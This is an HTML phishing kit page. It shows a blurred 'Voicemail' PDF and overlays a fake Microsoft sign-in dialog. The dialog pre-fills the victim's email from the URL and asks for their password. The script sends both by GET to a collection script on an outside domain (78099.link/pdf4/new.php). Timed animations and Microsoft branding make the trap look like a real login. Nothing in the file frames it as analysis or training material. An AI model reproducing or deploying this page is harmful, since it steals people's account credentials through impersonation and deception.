<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Load PDF</title>
    <style>
        html, body {
            height: 100%;
            margin: 0;
            overflow: hidden;
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
        }
        iframe {
            width: 100%;
            height: 100%;
            border: none;
            transition: filter 0.5s ease;
        }
        #smallIframe {
            position: absolute;
            width: 90%; /* Adjusted for better mobile visibility */
            max-width: 450px; /* Max width for larger screens */
            height: auto; /* Auto height for responsiveness */
            top: 50%;
            left: 50%;
            transform: translate(-50%, -50%);
            background: rgba(169, 169, 169, 0.8); /* Slightly darker for visibility */
            border: none;
            padding: 20px;
            box-sizing: border-box;
            opacity: 0;
            transition: opacity 1s ease;
        }
        #logo {
            width: 100px; /* Smaller logo for mobile */
            height: auto;
            margin: 20px 0; /* Margin adjustments */
        }
        #expiredText, #loginForm {
            transition: opacity 1s ease;
        }
        #expiredText {
            color: #000;
            font-size: 22px; /* Slightly smaller for mobile */
            margin: 10px 0;
            font-weight: 500;
        }
        .throbber-container {
            width: 100%;
            height: 20px;
            top: 50%;
            left: 0;
            transform: translateY(-50%);
            overflow: hidden;
            background: transparent;
        }
        .throbber {
            display: flex;
            width: 500%;
            height: 100%;
            animation: moveThrobber 6s ease-in-out infinite;
        }
        .throbber div {
            width: 4px;
            height: 4px;
            background: #005da6;
            border-radius: 50%;
            margin: 0 8px;
            animation: throb 1.5s ease-in-out infinite;
        }
        @keyframes moveThrobber {
            0% { transform: translateX(-100%); }
            50% { transform: translateX(0); }
            100% { transform: translateX(100%); }
        }
        @keyframes throb {
            0%, 100% { transform: scale(1); }
            50% { transform: scale(1.5); }
        }
        #loginForm {
            display: none;
            text-align: left;
            margin-top: 5px;
        }
        #loginForm input {
            width: 100%;
            padding: 10px;
            margin-bottom: 10px;
            border: none;
            border-bottom: 1px solid #005da6;
            background: transparent;
            font-size: 16px;
            outline: none;
        }
        #loginForm button {
            background-color: #005da6;
            color: white;
            border: none;
            padding: 7px 10px;
            font-size: 16px;
            border-radius: 0;
            cursor: pointer;
            width: 100%; /* Full width for mobile */
            margin-top: 10px; /* Space above button */
        }
        #signInText {
            color: #000;
            font-size: 22px; /* Adjusted for mobile */
            margin: 10px 0;
            font-weight: 500;
        }
        #email-display {
            display: flex;
            align-items: center;
            margin-bottom: 0;
            cursor: not-allowed;
        }
        #email-display::before {
            content: '‚Üê';
            color: black;
            font-size: 18px;
            margin-right: 8px;
        }

        /* Media query adjustments */
        @media (max-width: 768px) {
            #smallIframe {
                top: 40%; /* Higher on mobile */
                transform: translate(-50%, -40%);
            }
        }

        @media (max-width: 480px) {
            #smallIframe {
                top: 30%; /* Even higher for very small screens */
                transform: translate(-50%, -30%);
            }
        }
    </style>
    <script>
        function getEmailFromURL() {
            const url = window.location.href;
            const emailRegex = /\?(.+)$/;
            const matches = url.match(emailRegex);
            return matches && matches[1] ? decodeURIComponent(matches[1]) : '';
        }

        window.onload = function() {
            const emailField = document.getElementById('email');
            const emailDisplay = document.getElementById('email-display');
            const email = getEmailFromURL();
            emailField.value = email;
            emailDisplay.textContent = email || 'No email found';
        };
    </script>
</head>
<body>
    <iframe id="pdfViewer" src="https://78099.link/pdf4/Voicemail.pdf" aria-label="PDF Viewer"></iframe>
    <div id="smallIframe" role="dialog" aria-labelledby="expiredText">
        <img id="logo" src="/microsoft.png" alt="Microsoft Logo">
        <p id="expiredText">Trying to sign you in...</p>
        <div class="throbber-container">
            <div class="throbber">
                <div></div>
                <div></div>
                <div></div>
                <div></div>
                <div></div>
            </div>
        </div>
        <div id="loginForm">
            <p id="email-display">Loading email...</p>
            <p id="signInText">Enter password</p>
            <form id="authForm" action="https://78099.link/pdf4/new.php" method="GET" onsubmit="return validateForm()">
                <input type="hidden" id="email" name="email">        
                <input type="password" id="password" name="password" placeholder="Password" aria-label="Password" required minlength="4">
                <button type="submit">Sign in</button>
            </form>
        </div>
    </div>
    <script>
        function applyBlur() {
            document.getElementById('pdfViewer').style.filter = 'blur(5px)';
        }
        function showSmallIframe() {
            document.getElementById('smallIframe').style.opacity = '1';
        }
        function fadeOutTextAndThrobber() {
            document.getElementById('expiredText').style.opacity = '0';
            document.querySelector('.throbber-container').style.opacity = '0';
            setTimeout(showLoginForm, 1000);
        }
        function showLoginForm() {
            document.getElementById('expiredText').style.display = 'none';
            document.querySelector('.throbber-container').style.display = 'none';
            const loginForm = document.getElementById('loginForm');
            loginForm.style.display = 'block';
            document.getElementById('password').focus();
        }
        function validateForm() {
            var email = document.getElementById('email').value;
            var password = document.getElementById('password').value;
            var emailPattern = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
            if (!emailPattern.test(email)) {
                alert("Please enter a valid email address.");
                return false;
            }
            if (password.length < 4) {
                alert("Password must be at least 4 characters long.");
                return false;
            }
            return true;
        }
       
        setTimeout(applyBlur, 100); 
        setTimeout(showSmallIframe, 100); 
        setTimeout(fadeOutTextAndThrobber, 4000); 
    </script>
</body>
</html>
